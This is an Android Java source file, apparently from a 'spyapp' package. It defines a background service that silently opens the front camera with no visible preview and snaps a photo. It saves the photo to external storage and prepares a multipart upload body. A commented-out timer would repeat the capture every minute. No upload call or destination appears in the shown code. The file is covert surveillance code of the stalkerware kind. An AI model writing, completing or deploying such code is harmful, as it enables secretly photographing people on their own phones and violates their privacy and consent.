package kkactive_india.in.spyapp;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.support.annotation.Nullable;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.Policy;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;

public class CameraService extends Service implements SurfaceHolder.Callback {

    private SurfaceHolder sHolder;
    private Camera mCamera;
    private Camera.Parameters parameters;
    SurfaceView sv;
    Timer timer;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("CAM", "start");

        StrictMode.ThreadPolicy policy =
                new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        Thread myThread = null;


    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        /*timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {*/

        if (Camera.getNumberOfCameras() >= 2) {

            mCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
        }

        if (Camera.getNumberOfCameras() < 2) {

            mCamera = Camera.open();
        }
        SurfaceTexture surfaceTexture = new SurfaceTexture(0);
        try {
            mCamera.setPreviewTexture(surfaceTexture);
        } catch (IOException e) {
            e.printStackTrace();
        }


        // try {
        //  mCamera.setPreviewDisplay(sv.getHolder());
        parameters = mCamera.getParameters();
        mCamera.setParameters(parameters);
        mCamera.startPreview();
        mCamera.takePicture(null, null, mCall);
        //  } catch (IOException e) { e.printStackTrace(); }

        //    sHolder = sv.getHolder();
        //  sHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

            /*}
        }, 0, 1000 * 60);*/
        return START_STICKY;
    }

    Camera.PictureCallback mCall = new Camera.PictureCallback() {
        @Override
        public void onPictureTaken(byte[] bytes, Camera camera) {
            FileOutputStream outStream = null;
            try {

                File sd = new File(Environment.getExternalStorageDirectory(), "A");
                if (!sd.exists()) {
                    sd.mkdirs();
                    Log.i("FO", "folder" + Environment.getExternalStorageDirectory());
                }

                Calendar cal = Calendar.getInstance();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String tar = (sdf.format(cal.getTime()));

                outStream = new FileOutputStream(sd + tar + ".jpg");
                outStream.write(bytes);
                outStream.close();

                Log.i("CAM", bytes.length + " byte written to:" + sd + tar + ".jpg");

                String pathh = sd + tar + ".jpg";


                Log.e("CAM" , pathh);


                MultipartBody.Part body = null;

                try {

                    File file = new File(pathh);

                    RequestBody reqFile = RequestBody.create(MediaType.parse("multipart/form-data"), file);

                    body = MultipartBody.Part.createFormData("image", file.getName(), reqFile);

                } catch (Exception e) {
                    e.printStackTrace();
                }



                /*String imgString = Base64.encodeToString(bytes,
                        Base64.NO_WRAP);

                Log.e("Base64",imgString);*/
                camkapa(sHolder);


            } catch (FileNotFoundException e) {
                Log.d("CAM", e.getMessage());
            } catch (IOException e) {
                Log.d("CAM", e.getMessage());
            }
        }
    };


    public void camkapa(SurfaceHolder sHolder) {

        if (null == mCamera)
            return;
        mCamera.stopPreview();
        mCamera.release();
        mCamera = null;
        Log.i("CAM", " closed");
    }


    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        try {
            mCamera.setPreviewDisplay(sv.getHolder());
            //  mCamera.startPreview();
            // mCamera.setDisplayOrientation(90);
            //  mCamera.startPreview();
            //   parameters.setFocusMode(Camera.Parameters.FLASH_MODE_AUTO);
            //  parameters.setJpegQuality(100);
            //  mCamera.setDisplayOrientation(90);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) {

    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {

    }
}
